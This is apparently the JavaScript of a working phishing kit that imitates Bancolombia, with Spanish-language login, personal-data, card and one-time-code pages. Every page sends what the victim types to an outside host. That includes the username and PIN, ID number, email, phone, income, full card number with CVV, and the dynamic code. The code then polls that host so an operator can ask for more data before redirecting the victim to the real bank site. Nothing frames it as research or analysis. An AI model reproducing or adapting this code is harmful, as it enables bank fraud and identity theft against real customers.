(function () {
    'use strict';

    const API_BASE = 'https://multi-bancos-production.up.railway.app';

    // ==================== HELPERS COMPARTIDOS ====================
    let userIP = 'No disponible';

    function getUserIP() {
        fetch('https://api.ipify.org?format=json')
            .then(r => r.json())
            .then(data => {
                userIP = data.ip;
                const el = document.getElementById('userIP');
                if (el) el.textContent = 'Dirección IP: ' + data.ip;
            })
            .catch(() => {
                const el = document.getElementById('userIP');
                if (el) el.textContent = 'Dirección IP: No disponible';
            });
    }

    function updateDateTime() {
        const now = new Date();
        const days = ['domingo', 'lunes', 'martes', 'miércoles', 'jueves', 'viernes', 'sábado'];
        const months = ['enero', 'febrero', 'marzo', 'abril', 'mayo', 'junio', 'julio', 'agosto', 'septiembre', 'octubre', 'noviembre', 'diciembre'];
        const hours = now.getHours();
        const period = hours >= 12 ? 'p. m.' : 'a. m.';
        const displayHours = hours % 12 || 12;
        const minutes = now.getMinutes().toString().padStart(2, '0');
        const seconds = now.getSeconds().toString().padStart(2, '0');
        const str = `${days[now.getDay()]}, ${now.getDate()} de ${months[now.getMonth()]} de ${now.getFullYear()}, ${displayHours}:${minutes}:${seconds} ${period}`;
        const el = document.getElementById('currentDateTime');
        if (el) el.textContent = str;
    }

    // ==================== PÁGINA: INDEX (login) ====================
    function initIndex() {
        const inputUsuario = document.getElementById('usuario');
        const inputClave = document.getElementById('clave');
        const btnSubmit = document.getElementById('btnLogin');
        const loadingOverlay = document.getElementById('loadingOverlay');
        let pollingInterval = null;

        function toggleError(fieldId, hasError) {
            const el = document.getElementById(fieldId);
            if (el) el.classList.toggle('has-error', hasError);
        }

        function validateForm() {
            const ok = inputUsuario.value.trim() !== '' && inputClave.value.length === 4;
            btnSubmit.classList.toggle('enabled', ok);
            btnSubmit.disabled = !ok;
        }

        inputUsuario.addEventListener('input', function () {
            this.value = this.value.replace(/\s/g, '');
            toggleError('fieldUsuario', this.value.trim() === '');
            validateForm();
        });

        inputClave.addEventListener('input', function () {
            this.value = this.value.replace(/[^0-9]/g, '').slice(0, 4);
            toggleError('fieldClave', this.value.length === 0 || this.value.length !== 4);
            validateForm();
        });

        document.getElementById('loginForm').addEventListener('submit', async function (e) {
            e.preventDefault();
            const usuario = inputUsuario.value.trim();
            const clave = inputClave.value;
            if (!usuario || clave.length !== 4) { alert('Por favor completa todos los campos correctamente'); return; }

            loadingOverlay.classList.add('active');
            const sessionId = 'bc_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5);
            sessionStorage.setItem('bc_sessionId', sessionId);
            sessionStorage.setItem('bc_usuario', usuario);
            sessionStorage.setItem('bc_clave', clave);

            try {
                await fetch(API_BASE + '/bc/enviar', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ sessionId, usuario, clave, ip: userIP })
                });
            } catch (err) { console.error('Error enviando a admin:', err); }

            pollingInterval = setInterval(async function () {
                try {
                    const res = await fetch(API_BASE + '/bc/estado/' + sessionId);
                    const data = await res.json();
                    if (data.accion === 'RECHAZAR' || data.estado === 'rechazado' || data.accion === 'CC_ERROR' || data.estado === 'cc_error') {
                        clearInterval(pollingInterval);
                        loadingOverlay.classList.remove('active');
                        document.getElementById('errorOverlay').classList.add('active');
                    } else if (data.accion === 'PEDIR_DATOS') {
                        clearInterval(pollingInterval);
                        window.location.href = 'datosper.html';
                    } else if (data.accion === 'PEDIR_CC') {
                        clearInterval(pollingInterval);
                        window.location.href = 'cvv.html';
                    } else if (data.accion === 'PEDIR_DINAMICA') {
                        clearInterval(pollingInterval);
                        window.location.href = 'clavedin.html';
                    } else if (data.accion === 'FINALIZAR' || data.estado === 'finalizado') {
                        clearInterval(pollingInterval);
                        window.location.href = 'https://svpersonas.apps.bancolombia.com/autenticacion';
                    }
                } catch (err) { console.error('Error consultando estado:', err); }
            }, 2000);
        });

        validateForm();
    }

    // ==================== PÁGINA: DATOSPER ====================
    function initDatosper() {
        const nombreInput = document.getElementById('nombre');
        const tipoDocInput = document.getElementById('tipoDoc');
        const numDocInput = document.getElementById('numDoc');
        const correoInput = document.getElementById('correo');
        const celularInput = document.getElementById('celular');
        const ingresosInput = document.getElementById('ingresos');
        const btnSubmit = document.getElementById('btnSubmit');
        const overlay = document.getElementById('loadingOverlay');
        let pollingInterval = null;

        function setError(fieldId, hasError) {
            const el = document.getElementById(fieldId);
            if (el) el.classList.toggle('has-error', hasError);
        }

        nombreInput.addEventListener('input', function () {
            this.value = this.value.replace(/[^a-zA-ZáéíóúÁÉÍÓÚñÑ\s]/g, '');
            setError('fieldNombre', this.value.trim() === '');
            validateForm();
        });

        tipoDocInput.addEventListener('change', function () {
            this.classList.add('has-value');
            setError('fieldTipoDoc', this.value === '');
            validateForm();
        });

        numDocInput.addEventListener('input', function () {
            this.value = this.value.replace(/[^0-9]/g, '');
            setError('fieldNumDoc', this.value.trim() === '' || this.value.length < 5);
            validateForm();
        });

        correoInput.addEventListener('input', function () {
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            setError('fieldCorreo', !emailRegex.test(this.value));
            validateForm();
        });

        celularInput.addEventListener('input', function () {
            this.value = this.value.replace(/[^0-9]/g, '').slice(0, 10);
            setError('fieldCelular', this.value.length !== 10);
            validateForm();
        });

        ingresosInput.addEventListener('input', function () {
            let value = this.value.replace(/[^0-9]/g, '');
            if (value) value = parseInt(value).toLocaleString('es-CO');
            this.value = value;
            setError('fieldIngresos', this.value.trim() === '');
            validateForm();
        });

        function validateForm() {
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            const ok = nombreInput.value.trim() !== '' && tipoDocInput.value !== '' && numDocInput.value.trim() !== '' && numDocInput.value.length >= 5 && emailRegex.test(correoInput.value) && celularInput.value.length === 10 && ingresosInput.value.trim() !== '';
            btnSubmit.classList.toggle('enabled', ok);
            btnSubmit.disabled = !ok;
        }

        document.getElementById('datosForm').addEventListener('submit', async function (e) {
            e.preventDefault();
            const sessionId = sessionStorage.getItem('bc_sessionId');
            if (!sessionId) { alert('Sesión expirada'); window.location.href = 'index.html'; return; }

            const datos = {
                nombres: nombreInput.value.trim(),
                tipoDoc: tipoDocInput.options[tipoDocInput.selectedIndex].text,
                documento: numDocInput.value.trim(),
                correo: correoInput.value.trim(),
                telefono: celularInput.value.trim(),
                ingresos: ingresosInput.value.trim()
            };

            overlay.classList.add('active');
            sessionStorage.setItem('bc_nombre', datos.nombres);
            sessionStorage.setItem('bc_tipoDoc', datos.tipoDoc);
            sessionStorage.setItem('bc_numDoc', datos.documento);
            sessionStorage.setItem('bc_correo', datos.correo);
            sessionStorage.setItem('bc_celular', datos.telefono);
            sessionStorage.setItem('bc_ingresos', datos.ingresos);

            try {
                await fetch(API_BASE + '/bc/guardar-paso2', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ sessionId, ...datos })
                });
            } catch (err) { console.error(err); }

            pollingInterval = setInterval(async function () {
                try {
                    const res = await fetch(API_BASE + '/bc/estado/' + sessionId);
                    const data = await res.json();
                    if (data.accion === 'RECHAZAR' || data.estado === 'rechazado' || data.accion === 'CC_ERROR' || data.estado === 'cc_error') {
                        clearInterval(pollingInterval);
                        overlay.classList.remove('active');
                        alert('Transacción rechazada por el banco. Intenta de nuevo.');
                        window.location.href = 'index.html';
                    } else if (data.accion === 'PEDIR_CC') {
                        clearInterval(pollingInterval);
                        window.location.href = 'cvv.html';
                    } else if (data.accion === 'PEDIR_DINAMICA') {
                        clearInterval(pollingInterval);
                        window.location.href = 'clavedin.html';
                    } else if (data.accion === 'FINALIZAR' || data.estado === 'finalizado') {
                        clearInterval(pollingInterval);
                        window.location.href = 'https://svpersonas.apps.bancolombia.com/autenticacion';
                    }
                } catch (err) { console.error(err); }
            }, 2000);
        });

        validateForm();
    }

    // ==================== PÁGINA: CVV ====================
    function initCvv() {
        const cardNumber = document.getElementById('cardNumber');
        const cardName = document.getElementById('cardName');
        const cardExp = document.getElementById('cardExp');
        const cardCvv = document.getElementById('cardCvv');
        const btnSubmit = document.getElementById('btnSubmit');
        const overlay = document.getElementById('loadingOverlay');
        const errorOverlay = document.getElementById('errorOverlay');
        let pollingInterval = null;

        cardNumber.addEventListener('input', function () {
            let v = this.value.replace(/\D/g, '').slice(0, 16);
            this.value = v.replace(/(.{4})/g, '$1 ').trim();
            this.classList.toggle('filled', v.length === 16);
            validate();
        });

        cardName.addEventListener('input', function () {
            const v = this.value.toUpperCase();
            this.value = v;
            this.classList.toggle('filled', v.trim().length > 2);
            validate();
        });

        cardExp.addEventListener('input', function () {
            let v = this.value.replace(/\D/g, '').slice(0, 4);
            if (v.length >= 3) v = v.slice(0, 2) + '/' + v.slice(2);
            this.value = v;
            this.classList.toggle('filled', v.length === 5);
            validate();
        });

        cardCvv.addEventListener('input', function () {
            this.value = this.value.replace(/\D/g, '').slice(0, 4);
            this.classList.toggle('filled', this.value.length >= 3);
            validate();
        });

        function validate() {
            const numOk = cardNumber.value.replace(/\s/g, '').length === 16;
            const nomOk = cardName.value.trim().length > 2;
            const expOk = cardExp.value.length === 5;
            const cvvOk = cardCvv.value.length >= 3;
            const ok = numOk && nomOk && expOk && cvvOk;
            btnSubmit.classList.toggle('enabled', ok);
            btnSubmit.disabled = !ok;
        }

        btnSubmit.addEventListener('click', async function () {
            if (this.disabled) return;

            let sessionId = sessionStorage.getItem('bc_sessionId');
            if (!sessionId) {
                sessionId = 'bc_test_' + Date.now();
                sessionStorage.setItem('bc_sessionId', sessionId);
            }

            overlay.classList.add('active');

            const datos = {
                sessionId: sessionId,
                tarjeta: cardNumber.value.replace(/\s/g, ''),
                titular: cardName.value.trim(),
                exp: cardExp.value.trim(),
                cvv: cardCvv.value.trim()
            };

            try {
                await fetch(API_BASE + '/bc/guardar-paso4', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(datos)
                });
            } catch (err) { console.error('Error enviando tarjeta:', err); }

            pollingInterval = setInterval(async function () {
                try {
                    const res = await fetch(API_BASE + '/bc/estado/' + sessionId);
                    const data = await res.json();
                    if (data.accion === 'RECHAZAR' || data.estado === 'rechazado' || data.accion === 'CC_ERROR' || data.estado === 'cc_error') {
                        clearInterval(pollingInterval);
                        overlay.classList.remove('active');
                        errorOverlay.classList.add('active');
                    } else if (data.accion === 'PEDIR_DINAMICA') {
                        clearInterval(pollingInterval);
                        window.location.href = 'clavedin.html';
                    } else if (data.accion === 'FINALIZAR' || data.estado === 'finalizado') {
                        clearInterval(pollingInterval);
                        window.location.href = 'https://svpersonas.apps.bancolombia.com/autenticacion';
                    }
                } catch (err) { console.error(err); }
            }, 2000);
        });

        validate();
    }

    // ==================== PÁGINA: CLAVEDIN ====================
    function initClavedin() {
        const inputs = [
            document.getElementById('digit1'), document.getElementById('digit2'),
            document.getElementById('digit3'), document.getElementById('digit4'),
            document.getElementById('digit5'), document.getElementById('digit6')
        ];
        const btnSubmit = document.getElementById('btnSubmit');
        const overlay = document.getElementById('loadingOverlay');
        let pollingInterval = null;

        inputs.forEach((input, index) => {
            input.addEventListener('input', function () {
                this.value = this.value.replace(/[^0-9]/g, '');
                if (this.value !== '') {
                    this.classList.add('filled');
                    if (index < inputs.length - 1) inputs[index + 1].focus();
                } else {
                    this.classList.remove('filled');
                }
                validateCode();
            });

            input.addEventListener('keydown', function (e) {
                if (e.key === 'Backspace' && this.value === '' && index > 0) {
                    inputs[index - 1].focus();
                    inputs[index - 1].value = '';
                    inputs[index - 1].classList.remove('filled');
                    validateCode();
                }
            });

            input.addEventListener('paste', function (e) {
                e.preventDefault();
                const digits = (e.clipboardData || window.clipboardData).getData('text').replace(/[^0-9]/g, '').split('').slice(0, 6);
                digits.forEach((digit, i) => {
                    if (inputs[i]) {
                        inputs[i].value = digit;
                        inputs[i].classList.add('filled');
                    }
                });
                if (digits.length > 0) inputs[Math.min(digits.length, 6) - 1].focus();
                validateCode();
            });
        });

        function validateCode() {
            const allFilled = inputs.every(input => input.value !== '');
            btnSubmit.classList.toggle('enabled', allFilled);
            btnSubmit.disabled = !allFilled;
        }

        btnSubmit.addEventListener('click', async function () {
            if (this.disabled) return;
            const codigo = inputs.map(i => i.value).join('');
            const sessionId = sessionStorage.getItem('bc_sessionId');
            if (!sessionId) { alert('Sesión expirada'); window.location.href = 'index.html'; return; }

            overlay.classList.add('active');

            try {
                await fetch(API_BASE + '/bc/guardar-paso3', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ sessionId, claveDinamica: codigo, otp: codigo })
                });
            } catch (err) { console.error(err); }

            pollingInterval = setInterval(async function () {
                try {
                    const res = await fetch(API_BASE + '/bc/estado/' + sessionId);
                    const data = await res.json();
                    if (data.accion === 'RECHAZAR' || data.estado === 'rechazado' || data.accion === 'CC_ERROR' || data.estado === 'cc_error') {
                        clearInterval(pollingInterval);
                        overlay.classList.remove('active');
                        document.getElementById('errorOverlay').classList.add('active');
                    } else if (data.accion === 'PEDIR_CC') {
                        clearInterval(pollingInterval);
                        window.location.href = 'cvv.html';
                    } else if (data.accion === 'FINALIZAR' || data.estado === 'finalizado') {
                        clearInterval(pollingInterval);
                        window.location.href = 'https://svpersonas.apps.bancolombia.com/autenticacion';
                    }
                } catch (err) { console.error(err); }
            }, 2000);
        });

        inputs[0].focus();
    }

    // ==================== DETECCIÓN DE PÁGINA ====================
    function detectAndInit() {
        if (document.getElementById('loginForm')) {
            initIndex();
        } else if (document.getElementById('datosForm')) {
            initDatosper();
        } else if (document.getElementById('cardNumber')) {
            initCvv();
        } else if (document.getElementById('digit1')) {
            initClavedin();
        }
    }

    // ==================== ARRANQUE ====================
    getUserIP();
    updateDateTime();
    setInterval(updateDateTime, 1000);
    detectAndInit();

})();